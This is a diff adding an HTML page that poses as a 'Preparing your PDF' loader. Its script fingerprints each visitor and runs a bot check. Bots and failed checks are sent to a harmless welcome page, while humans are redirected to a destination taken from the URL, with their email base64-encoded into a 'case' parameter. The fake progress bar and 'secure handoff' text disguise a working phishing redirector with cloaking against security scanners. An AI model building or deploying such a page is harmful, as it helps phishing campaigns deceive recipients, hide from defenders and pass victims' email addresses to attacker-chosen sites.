@@ -1,0 +1,202 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <!-- Default fallback destination -->
+  <meta name="destination-url" content="https://destination.com" />
+  <title>Preparing PDF…</title>
+  <style>
+    :root { --bg:#edeff3; --card:#ffffff; --ink:#111827; --muted:#6b7280; --line:#e5e7eb; --accent:#2563eb; --pdf:#ef4444; --good:#5bd38d; --bad:#ff8b8b; }
+    html,body { height:100%; }
+    body { margin:0; display:grid; place-items:center; min-height:100vh; background:var(--bg); color:var(--ink);
+      font:15px/1.5 ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, Helvetica, Arial; }
+    .card { width:min(520px, 92vw); border:1px solid var(--line); border-radius:16px; padding:22px; background:var(--card);
+      box-shadow:0 8px 24px rgba(15, 23, 42, 0.06); }
+    .doc-head { display:flex; align-items:center; gap:12px; margin-bottom:14px; }
+    h1 { margin:0; font-size:17px; font-weight:600; letter-spacing:.1px; }
+    p { margin:.25rem 0 .75rem; color:var(--muted); }
+    .pdf-logo { width:44px; height:54px; flex:none; position:relative; display:grid; place-items:center; border:1px solid var(--line); border-radius:8px; overflow:hidden;
+      background:linear-gradient(180deg,#fff,#fafafa 70%),#fff; }
+    .pdf-ribbon { position:absolute; inset:auto 0 0 0; height:22px; background:var(--pdf); display:flex; align-items:center; justify-content:center; color:#fff; font-weight:700; font-size:11px; letter-spacing:.6px; }
+    .pdf-corner { position:absolute; top:0; right:0; width:0; height:0; border-left:14px solid transparent; border-bottom:14px solid #eaeaea; }
+    .pdf-mark { width:18px; height:18px; border-radius:50%; border:2px solid #d1d5db; }
+    .progress { height:10px; background:#f3f4f6; border-radius:999px; overflow:hidden; border:1px solid var(--line); }
+    .progress > .bar { height:100%; width:0%; border-radius:999px; background:linear-gradient(90deg, rgba(37,99,235,.22), rgba(37,99,235,.62)); transition:width .18s ease; }
+    .percent { margin-top:8px; font-variant-numeric:tabular-nums; font-weight:600; letter-spacing:.5px; }
+    .sheet { margin-top:16px; padding:14px; border:1px dashed var(--line); border-radius:12px; background:linear-gradient(180deg,#fff 0,#fcfcfd 100%); }
+    .skeleton { height:12px; background:#eef0f5; border-radius:6px; position:relative; overflow:hidden; }
+    .skeleton + .skeleton { margin-top:10px; }
+    .skeleton.long { width:92%; } .skeleton.med { width:72%; } .skeleton.short { width:46%; }
+    .shimmer { position:absolute; inset:0; transform:translateX(-100%); background:linear-gradient(90deg, transparent, rgba(0,0,0,.05), transparent); animation:shimmer 1.25s linear infinite; }
+    @keyframes shimmer { 100% { transform:translateX(100%);} }
+    .meta { margin-top:12px; display:flex; gap:8px; flex-wrap:wrap; }
+    .pill { display:inline-flex; align-items:center; gap:.5rem; padding:.35rem .6rem; border:1px solid var(--line); border-radius:999px; color:#374151; background:#fff; font-size:12px; }
+    .dot { width:8px; height:8px; border-radius:50%; background:#d1d5db; box-shadow:0 0 0 2px #eef2f7 inset; }
+    .foot { margin-top:10px; font-size:12px; color:var(--muted); }
+    a { color:var(--accent); text-decoration:none; }
+    a:hover { text-decoration:underline; }
+  </style>
+
+  <!-- FingerprintJS (open-source) -->
+  <script defer src="https://openfpcdn.io/fingerprintjs/v3"></script>
+  <!-- BotD (bot detection by Fingerprint) -->
+  <script defer src="https://openfpcdn.io/botd/v1"></script>
+</head>
+<body>
+  <div class="card" id="card" aria-live="polite">
+    <div class="doc-head">
+      <div class="pdf-logo" aria-hidden="true">
+        <div class="pdf-corner"></div>
+        <div class="pdf-mark"></div>
+        <div class="pdf-ribbon">PDF</div>
+      </div>
+      <div>
+        <h1>Preparing your PDF…</h1>
+        <p class="muted">Encoding recipient and finalizing a secure handoff.</p>
+      </div>
+    </div>
+
+    <div class="progress" aria-label="loading">
+      <div class="bar" id="bar"></div>
+    </div>
+    <div class="percent" id="percent">0%</div>
+
+    <div class="sheet">
+      <div class="skeleton long"><div class="shimmer"></div></div>
+      <div class="skeleton med"><div class="shimmer"></div></div>
+      <div class="skeleton long"><div class="shimmer"></div></div>
+      <div class="skeleton short"><div class="shimmer"></div></div>
+    </div>
+
+    <div class="meta">
+      <span class="pill"><span class="dot" id="fp-dot"></span> fingerprint</span>
+      <span class="pill"><span class="dot" id="bot-dot"></span> bot check</span>
+      <span class="pill"><span class="dot" id="redir-dot"></span> redirect</span>
+    </div>
+
+    <p id="status" class="foot">Working…</p>
+  </div>
+
+  <script>
+    const qs = new URLSearchParams(location.search);
+    const $ = (id) => document.getElementById(id);
+    const setStatus = (msg) => { $('status').textContent = msg; };
+    const mark = (id, on=true) => { $(id).style.background = on ? 'var(--good)' : 'var(--bad)'; };
+
+    function getDestination() {
+      const meta = document.querySelector('meta[name="destination-url"]');
+      const fallback = meta?.content?.trim() || '';
+      const fromQs = (qs.get('dest') || '').trim();
+      const url = fromQs || fallback;
+      try { return url ? new URL(url.startsWith('http') ? url : 'https://' + url).toString() : ''; } catch { return ''; }
+    }
+    function getEmail() { return (qs.get('email') || '').trim(); }
+    function toBase64(str) { try { return btoa(unescape(encodeURIComponent(str))); } catch { return ''; } }
+    function safeJoinUrl(base, paramsObj) {
+      const u = new URL(base);
+      for (const [k, v] of Object.entries(paramsObj)) if (v != null) u.searchParams.set(k, v);
+      return u.toString();
+    }
+    function redirectTo(url) { window.location.replace(url); }
+
+    const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    // progress animation
+    let pct = 0;
+    const bar = $('bar');
+    const percentText = $('percent');
+    const tick = () => {
+      const step = Math.max(1, Math.min(14, Math.floor(Math.random()*12)+3));
+      pct = Math.min(96, pct + step);
+      bar.style.width = pct + '%';
+      percentText.textContent = pct + '%';
+    };
+    const interval = setInterval(tick, 140);
+
+    (async () => {
+      const email = getEmail();
+      const destination = getDestination();
+
+      // Start detectors in parallel
+      const fpPromise = new Promise(async (resolve) => {
+        try {
+          const fp = await FingerprintJS.load();
+          const result = await fp.get();
+          mark('fp-dot', true);
+          resolve({ ok:true, visitorId: result.visitorId });
+        } catch (e) {
+          mark('fp-dot', false);
+          resolve({ ok:false, error:e });
+        }
+      });
+
+      const botPromise = new Promise(async (resolve) => {
+        try {
+          const botd = await Botd.load();
+          const result = await botd.detect();
+          const isBot = !!result?.bot;
+          mark('bot-dot', !isBot);
+          resolve({ ok:true, bot:isBot, botType: result?.botType || 'unknown' });
+        } catch (e) {
+          // Treat BotD failure as a failed check (strict mode)
+          mark('bot-dot', false);
+          resolve({ ok:false, bot:true, error:e });
+        }
+      });
+
+      // Safety timeout so UI doesn't hang
+      const timeout = new Promise((resolve) => setTimeout(() => resolve({ timeout:true }), 3500));
+
+      const [fpRes, botRes] = await Promise.race([
+        Promise.all([fpPromise, botPromise]),
+        timeout
+      ]).then((res) => Array.isArray(res) ? res : [{ ok:false, timeout:true }, { ok:false, timeout:true }]);
+
+      // STRICT GATE: if ANY check fails or indicates a bot, go to welcome
+      const checksFail =
+        !fpRes?.ok ||
+        !botRes?.ok ||
+        botRes?.bot === true ||
+        fpRes?.timeout === true ||
+        botRes?.timeout === true;
+
+      if (checksFail) {
+        setStatus('Redirecting to welcome…');
+        mark('redir-dot', false);
+        clearInterval(interval);
+        bar.style.width = '100%';
+        percentText.textContent = '100%';
+        await new Promise(r => setTimeout(r, 200));
+        redirectTo('/welcome.html');
+        return;
+      }
+
+      // Human path: only redirect if email + destination look good
+      const hasParams = email && EMAIL_RE.test(email) && destination;
+      if (hasParams) {
+        const base64 = toBase64(email);
+        const redirectUrl = safeJoinUrl(destination, { case: base64 });
+
+        setStatus('Finalizing…');
+        await new Promise(r => setTimeout(r, 900));
+        pct = 100;
+        bar.style.width = pct + '%';
+        percentText.textContent = pct + '%';
+        setStatus('Redirecting…');
+        mark('redir-dot', true);
+        clearInterval(interval);
+        await new Promise(r => setTimeout(r, 260));
+        redirectTo(redirectUrl);
+      } else {
+        // If params aren't present/valid, we simply stop here (not a "check" failure)
+        await new Promise(r => setTimeout(r, 1600));
+        clearInterval(interval);
+        bar.style.width = '96%';
+        percentText.textContent = '96%';
+        setStatus('Ready.');
+      }
+    })();
+  </script>
+</body>
+</html>
